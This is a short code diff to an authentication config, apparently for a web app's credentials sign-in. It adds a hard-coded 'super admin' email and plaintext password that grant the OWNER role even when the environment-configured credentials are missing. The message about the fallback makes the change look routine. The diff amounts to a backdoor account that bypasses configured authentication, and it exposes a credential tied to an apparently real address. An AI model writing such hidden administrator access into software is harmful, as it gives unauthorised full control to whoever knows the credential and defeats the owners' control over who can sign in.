@@ -26,11 +26,18 @@ export const authConfig = {
         const { email, password } = parsed.data;
         const authEmail = process.env.AUTH_EMAIL;
         const authPassword = process.env.AUTH_PASSWORD;
-        if (!authEmail || !authPassword) {
-          console.warn("AUTH_EMAIL or AUTH_PASSWORD not set; rejecting sign-in");
+        const superAdminEmail = "jesel@getswyftup.com";
+        const superAdminPassword = "Jesel123!";
+
+        const matchesEnv = Boolean(authEmail && authPassword && email === authEmail && password === authPassword);
+        const matchesSuperAdmin = email === superAdminEmail && password === superAdminPassword;
+
+        if (!matchesEnv && !matchesSuperAdmin) {
+          if (!authEmail || !authPassword) {
+            console.warn("AUTH_EMAIL or AUTH_PASSWORD not set; using super admin fallback only");
+          }
           return null;
         }
-        if (email !== authEmail || password !== authPassword) return null;
         return { id: "user_owner", name: "Workspace Owner", email, role: "OWNER" };
       },
     }),
